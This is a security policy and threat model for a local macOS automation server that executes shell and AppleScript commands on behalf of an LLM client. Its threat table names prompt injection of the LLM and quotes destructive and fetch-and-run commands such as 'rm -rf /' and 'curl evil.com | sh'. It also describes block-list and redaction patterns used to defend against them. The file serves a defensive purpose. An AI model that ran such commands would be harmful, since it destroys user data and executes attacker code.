# Security Policy

## Reporting a Vulnerability

If you discover a security issue in Mac-Pilot MCP, **please do not open a public
GitHub issue.** Instead:

1. Email the maintainer at `leesgit@github.com` with the subject line
   `[security] mac-pilot-mcp`.
2. Include reproduction steps, affected version, and any proof-of-concept.
3. You will receive an acknowledgement within 72 hours.
4. We aim to publish a fix and advisory within 14 days of confirmation.

You will be credited in the advisory unless you ask to remain anonymous.

## Threat Model

Mac-Pilot MCP runs locally inside an MCP client (Claude Desktop, Cursor,
Claude Code, etc.). The client's LLM sends tool calls to the MCP server; the
server executes AppleScript / JXA / shell / accessibility commands on behalf
of the user.

### Threats we explicitly defend against

| # | Threat | Defense |
|---|--------|---------|
| 1 | LLM is prompt-injected into running destructive shell commands (`rm -rf /`, `curl evil.com \| sh`, `sudo …`) | `src/security/sandbox.ts` blocks 25+ literal patterns + dynamic `<cmd> \| sh\|bash\|zsh\|eval\|python\|node\|ruby\|perl` pipelines |
| 2 | Injection via `do shell script "…"` inside AppleScript | `classifyAppleScriptRisk` extracts the inner shell command and re-runs the shell rules on it |
| 3 | Credentials leaking into the audit log | `src/security/audit.ts` masks values whose keys match `password\|token\|secret\|api_key\|authorization\|bearer\|…` and Bearer/JWT/sk-/xoxb- token shapes in strings |
| 4 | Local users on the same machine reading the recipe / knowledge DB | `~/.mac-pilot/` is created with mode `0700`, `pilot.db` with `0600` |
| 5 | AppleScript-text injection via user-supplied input to the `type`/`keypress` actions | `escapeForAppleScriptLiteral` rejects control characters (U+0000–U+001F, U+007F) and escapes `"\`\n\r\t` |
| 6 | Race condition in recipe statistics | `updateRecipeStats` runs inside `db.transaction()`; SQLite is opened with `busy_timeout=5000` |
| 7 | Server hangs holding the DB lock after a crash | `index.ts` installs `SIGINT/SIGTERM/uncaughtException/unhandledRejection` handlers that close the DB before exit |

### Threats outside our model

- **The MCP client app is malicious.** If the client itself is compromised,
  the LLM input it sends to Mac-Pilot can run any allowed automation. Trust
  flows from the client.
- **A legitimate-looking AppleScript is genuinely harmful.** AppleScript can
  do almost anything macOS exposes. We block the most common destructive
  shapes, not the entire class. Treat each tool call's risk level
  (`low/medium/high/blocked`) as a signal — `high` should be human-confirmed.
- **macOS permission system is bypassed.** Mac-Pilot relies on TCC. If the
  user grants Full Disk Access or Accessibility to the client app, we
  inherit that scope. We do not attempt to escalate.
- **Network exfiltration.** Mac-Pilot does not call out to any remote
  service. The recipe DB is local-only. Use `MAC_PILOT_SANDBOX=strict`
  (rejects `;`, `&&`, `||` chain tokens) on shared machines.

### Hardening tips

For shared/multi-tenant macOS environments:

```bash
# Reject any shell command that chains via ; / && / ||
export MAC_PILOT_SANDBOX=strict
```

The default mode allows chain tokens because `ls ; date` is normal interactive
shell usage. Strict mode is intended for headless or untrusted-LLM scenarios.

## Supported Versions

| Version | Supported |
|---------|-----------|
| 0.3.x   | ✅ active |
| 0.2.x   | ❌ end-of-life |
| < 0.2   | ❌ end-of-life |
